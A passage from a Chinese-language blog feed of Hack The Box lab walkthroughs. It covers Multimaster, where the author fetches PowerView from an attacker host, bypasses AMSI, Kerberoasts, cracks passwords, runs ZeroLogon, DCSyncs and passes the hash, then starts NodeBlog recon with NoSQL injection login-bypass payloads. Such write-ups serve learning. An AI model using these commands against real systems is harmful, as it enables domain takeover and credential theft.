class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; wget http://10.10.16.15/PowerView.ps1 -O PowerView.ps1<br>*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; . .\PowerView.ps1<br>At C:\Users\sbauer\desktop\PowerView.ps1:1 char:1<br>+ <span class="hljs-comment">#requires -version 2</span><br>+ ~~~~~~~~~~~~~~~~~~~~<br>This script contains malicious content and has been blocked by your antivirus software.<br>At C:\Users\sbauer\desktop\PowerView.ps1:1 char:1<br>+ <span class="hljs-comment">#requires -version 2</span><br>+ ~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : ParserError: (:) [], ParseException<br>    + FullyQualifiedErrorId : ScriptContainedMaliciousContent<br>*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; Bypass-4MSI<br><br>Info: Patching 4MSI, please be patient...<br><br>[+] Success!<br></code></pre></td></tr></table></figure><p>先创建一组凭据对象：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; . .\PowerView.ps1<br>*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; <span class="hljs-variable">$SecPassword</span> = ConvertTo-SecureString <span class="hljs-string">&#x27;D3veL0pM3nT!&#x27;</span> -AsPlainText -Force<br>*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; <span class="hljs-variable">$Cred</span> = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;MEGACORP\sbauer&#x27;</span>, <span class="hljs-variable">$SecPassword</span>)<br></code></pre></td></tr></table></figure><p>然后用这组凭据对象去和域控认证为jorden设置SPN：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; Set-DomainObject -Credential <span class="hljs-variable">$Cred</span> -Identity jorden -SET @&#123;serviceprincipalname=<span class="hljs-string">&#x27;nonexistent/BLAHBLAH&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>设置完后可以尝试请求该SPN票据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; Get-DomainSPNTicket -Credential <span class="hljs-variable">$Cred</span> <span class="hljs-string">&#x27;nonexistent/BLAHBLAH&#x27;</span> | fl<br>Warning: [Invoke-UserImpersonation] powershell.exe is not currently <span class="hljs-keyword">in</span> a single-threaded apartment state, token impersonation may not work.<br>Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: MEGACORP\sbauer<br><br><br>SamAccountName       : UNKNOWN<br>DistinguishedName    : UNKNOWN<br>ServicePrincipalName : nonexistent/BLAHBLAH<br>TicketByteHexStream  :<br>Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN<span class="hljs-variable">$nonexistent</span>/BLAHBLAH*$0A972DA54CC4457B3574CD4F751F9455<span class="hljs-variable">$7933C5A710ECDD7D23820210FCFA7A6CDDD2D38369F6249F31C58C1760AE6559D250E92B801E6C378AAAD168349D69E2BD16DB73D0241286DFD4C808DB6413D261855B31456558</span><br>                       9EE2EED35D2728175575273CE97C6C09E1DC963C3A2441BD0AA9D612583B989B95C7C496582E5D28A3632D9217AB3C43E9E612B63E62652ECD809E418400CD4D8CDE688A9811B4F9FDE77AC4FAAF781BFE6480F96DD07103E597C90F1B40BE0B23DDE90B091EE9A27175D0C0E016F483E9<br>                       A22705461E0852235F01E6AFC4915DD29825FA25E8CF3E72C3CD103D72E966D74AEBE9825508C77B46C86B26F9706CE49D9E44FE161535DBBB2634EBCA1A4E07993B3CB6D78FDFB1CC94F6FE386075DDA185F026338E4278F006FCCD2E7C7DEEE8B14D06BA0DBAE52E10BC65369246B197<br>                       7B50593664829373525660EDE1D2667DDAEF0F65FA7122C32D6C019C925E23FD33E4162E5F3AC19E8649E1B16272CA939C14960A8AB4EA7F7B5EB4B33F82519E5EF3360AAEA35EA3E297088C9A63C8FB6EE249AB6790A7E9EAA5BAFA373E68ABDE108BB31794B22A6E730D0B85309E4B4F<br>                       DAEAF29A976B1A7A46AED3699FEB70A1FD5BA63E8D57587177F299F41F9F318F92A2E2D096535496ED6F10DD0F0F97F06A711814412D093B5818A2B70D92CC788E071BDAD2870D044FC8BA38EE9516E7915D4C9A8CD1561EF39B3ABF65555B51E52196DEE6283754B8243BF914CA97B2B7<br>                       A0252B46F759028EB5240044D90877CFE4BC9D983F88BE08E0FF1C6AFE04BEF0389816935E82AD506DA0A844BC56139ED95C51E329711B89B2B03CCDC5A7618EF1A792F5FDAC3BD2019C7B035EBE20EAB724698E4C871F60757B96370EF3A48A1D1CD18515201216EDEA2BCC9D2E5E4A8D<br>                       7A60E53D4D51A4EBCE818CE43500A112DDF8BD5E58669838961D59D2FE37061714E237C436E476F22007A242F1D225ACAA544CED847B27923A152921DE06AF0DD48D4659F33BFDFEE17511B66D5A230AFA9CD2751831B0FDF0B2DD6216874F24CDC62A4E6F6B469AED73B005C5D038C64B<br>                       4A309DB7E1E37AF56C6CAFE4F1FCA8AF77A9751A9AB04F144697CAC6189B143306F950B2742C6FDCD6878DF3A7081EF9D5BF67632C5DCA52D92103466543A3467B2AB44358625D3BB0C5747D35A625BC9ABB70A11140CF1775C60A1468C4EEC5AED3064ECCCEDF59067413A4351DFCBB40<br>                       2CA732DA75C99FB8C2ACD48719A0696A88C8C581799A3105EA9A13F7EB956CA4F8B93C10DBD01EDDFC4C2A0D9DE05E54E963301F713A4BA8D6772A0FC71349A973DF9C1CE4695E78FD493A2574F33CC1DE70631E73BEB0A88F2CB136953A804AB5FA7F7287155660AB0987F58CC6986B79<br>                       BB63D9CB80A8EB0C1F8CC1ADD255C6CBE6DA039BE7CF1BD19FF39CA9FA678A9576B8851EBDED283B5A8D7CB59E44964FC45C419B241F404716E9848A7DA2925758C6396C3438E0EBCECDE9227D9022AC42EE4AFDA7363F105930A3716F172299172B2D998591303C<br><br>Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle<br></code></pre></td></tr></table></figure><p>可以从中破解密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ hashcat -h | grep 18200<br>  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol<br>                                                                                                                                             <br>Archlinux:~/HackTheBox$ hashcat -a 0 -m 18200 ticket /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 3.1  Linux, Release, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>======================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-AMD Ryzen 7 6800H with Radeon Graphics, 14349/28763 MB (4096 MB allocatable), 16MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashfile <span class="hljs-string">&#x27;ticket&#x27;</span> on line 1 (<span class="hljs-variable">$krb5t</span>...5930A3716F172299172B2D998591303C): Separator unmatched<br>No hashes loaded.<br><br>Started: Fri Dec 23 11:35:05 2022<br>Stopped: Fri Dec 23 11:35:05 2022<br></code></pre></td></tr></table></figure><p>hashcat对格式非常非常严谨或许我们复制错了也说不定，但是john每次读取哈希并不会很精准但往往总是能意外的破解出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ john ticket -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <br>--------------------------------------------------------------------------<br>The library attempted to open the following supporting CUDA libraries,<br>but each of them failed.  CUDA-aware support is disabled.<br>libcuda.so.1: cannot open shared object file: No such file or directory<br>libcuda.dylib: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.so.1: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.dylib: cannot open shared object file: No such file or directory<br>If you are not interested <span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> run with<br>--mca opal_warn_on_missing_libcuda 0 to suppress this message.  If you are interested<br><span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> try setting LD_LIBRARY_PATH to the location<br>of libcuda.so.1 to get passed this issue.<br>--------------------------------------------------------------------------<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])<br>Will run 16 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>rainforest786    (?)<br>1g 0:00:00:00 DONE (2022-12-23 11:34) 1.612g/s 7101Kp/s 7101Kc/s 7101KC/s rajalacy..raileys<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure><p>然后登陆winrm：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Archlinux:~/HackTheBox<span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;MEGACORP\jorden&quot;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;rainforest786&#x27;</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.179</span><br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">4</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\jorden\Documents&gt; whoami<br>megacorp\jorden<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\jorden\Documents&gt; <br></code></pre></td></tr></table></figure><h3 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag:"></a>Get Flag:</h3><p>jorden有备份权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\jorden\Documents&gt; <span class="hljs-built_in">whoami</span> /all<br>.......................................................<br><br>Privilege Name                Description                         State<br>============================= =================================== =======<br>SeMachineAccountPrivilege     Add workstations to domain          Enabled<br>SeSystemtimePrivilege         Change the system time              Enabled<br>SeBackupPrivilege             Back up files and directories       Enabled<br>SeRestorePrivilege            Restore files and directories       Enabled<br>SeShutdownPrivilege           Shut down the system                Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking            Enabled<br>SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span>      Enabled<br>SeTimeZonePrivilege           Change the time zone                Enabled<br><br></code></pre></td></tr></table></figure><p>SeBackupPrivilege 可以备份任何系统文件，可以滥用去读取任何文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\jorden\Documents&gt; robocopy /b C:\<span class="hljs-built_in">users</span>\administrator\desktop C:\programdata\temp<br><br>-------------------------------------------------------------------------------<br>   ROBOCOPY     ::     Robust File Copy <span class="hljs-keyword">for</span> Windowss<br>-------------------------------------------------------------------------------<br><br>  Started : Thursday, December 22, 2022 7:47:37 PM<br>   Source : C:\<span class="hljs-built_in">users</span>\administrator\desktop\<br>     Dest : C:\programdata\temp\<br><br>    Files : *.*<br><br>  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30<br><br>------------------------------------------------------------------------------<br><br>          New Dir          2    C:\<span class="hljs-built_in">users</span>\administrator\desktop\<br>            New File                 488        desktop.ini<br>  0%<br>100%<br>            New File                  34        root.txt<br>  0%<br>100%<br><br>------------------------------------------------------------------------------<br><br>               Total    Copied   Skipped  Mismatch    FAILED    Extras<br>    Dirs :         1         1         0         0         0         0<br>   Files :         2         2         0         0         0         0<br>   Bytes :       522       522         0         0         0         0<br>   Times :   0:00:00   0:00:00                       0:00:00   0:00:00<br>   Ended : Thursday, December 22, 2022 7:47:37 PM<br><br>*Evil-WinRM* PS C:\Users\jorden\Documents&gt; <span class="hljs-built_in">type</span> C:\programdata\temp\root.txt<br>9c5d1............................................<br></code></pre></td></tr></table></figure><h3 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon:"></a>ZeroLogon:</h3><p>漏洞文章：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://www.anquanke.com/post/id/219374<br></code></pre></td></tr></table></figure><p>漏洞利用脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/dirkjanm/CVE-2020-1472<br></code></pre></td></tr></table></figure><p>先打payload将域控机器账户密码清空：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/Public/CVE-2020-1472$ python cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179<br>Performing authentication attempts...<br>=================================================<br>Target vulnerable, changing account password to empty string<br><br>Result: 0<br><br>Exploit complete!<br></code></pre></td></tr></table></figure><p>然后用域控机器账户去DCSync：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/Public/CVE-2020-1472$ secretsdump.py -no-pass -just-dc MULTIMASTER\<span class="hljs-variable">$@10</span>.10.10.179<br>Impacket v0.10.1.dev1+20221214.172823.8799a1a2 - Copyright 2022 Fortra<br><br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06e3ae564999dbad74e576cdf0f717d3:::<br>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>MEGACORP.LOCAL\svc-nas:1103:aad3b435b51404eeaad3b435b51404ee:fe90dcf97ce6511a65151881708d6027:::<br>MEGACORP.LOCAL\tushikikatomo:1110:aad3b435b51404eeaad3b435b51404ee:1c9c8bfd28d000e8904f23c280b25d21:::<br>MEGACORP.LOCAL\andrew:1111:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::<br></code></pre></td></tr></table></figure><p>然后横向移动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/Public/CVE-2020-1472$ evil-winrm -i 10.10.10.179 -u administrator -H <span class="hljs-string">&#x27;69cbf4a9b7415c9e1caf93d51d971be0&#x27;</span><br><br>Evil-WinRM shell v3.4<br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">whoami</span><br>megacorp\administrator<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">cd</span> ../desktop<br>*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <span class="hljs-built_in">type</span> root.txt<br>9c5d11c8be8ec6e04777e8458094d800<br>*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - NodeBlog</title>
    <link href="/post/HackTheBox-NodeBlog.html"/>
    <url>/post/HackTheBox-NodeBlog.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><h5 id="Masscan："><a href="#Masscan：" class="headerlink" title="Masscan："></a>Masscan：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.139 --rate 2000 -e tun0<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-14 13:26:59 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 5000/tcp on 10.10.11.139                                  <br>Discovered open port 22/tcp on 10.10.11.139 <br></code></pre></td></tr></table></figure><h5 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo nmap -sC -sV -Pn 10.10.11.139 -p22,5000<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-14 21:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.139<br>Host is up (0.62s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)<br>|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)<br>|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)<br>5000/tcp open  http    Node.js (Express middleware)<br>|_http-title: Blog<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 31.29 seconds<br></code></pre></td></tr></table></figure><h4 id="NOSQL身份认证绕过："><a href="#NOSQL身份认证绕过：" class="headerlink" title="NOSQL身份认证绕过："></a>NOSQL身份认证绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://nodeblog.htb:5000/<br>http://nodeblog.htb:5000/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.11.139], Script[JavaScript], Title[Blog], X-Powered-By[Express], X-UA-Compatible[IE=edge]<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514223939510.png" alt="image-20220514223939510"  /><p>没什么有用的信息，就一个登录框，可以随便输入一下参数抓包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>nodeblog.htb:5000<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh,en-US;q=0.7,en;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>25<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://nodeblog.htb:5000<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://nodeblog.htb:5000/login<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-pgsql"><span class="hljs-keyword">user</span>=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">admin</span></span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings<span class="hljs-regexp">/tree/m</span>aster/NoSQL%<span class="hljs-number">20</span>Injection<span class="hljs-comment">#authentication-bypass</span><br></code></pre></td></tr></table></figure><p>可以构造一下参数，但是不行：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">user</span>=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>[$ne]=<span class="hljs-keyword">password</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514224929175.png" alt="image-20220514224929175"  /><p>nodejs嘛，可能会是以json提交：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.139:5000<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>46<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.139:5000<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.139:5000/login<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;password&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>返回包中会有这么一段信息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">required</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span>&gt;</span>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <br>            Invalid Password<br>        <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 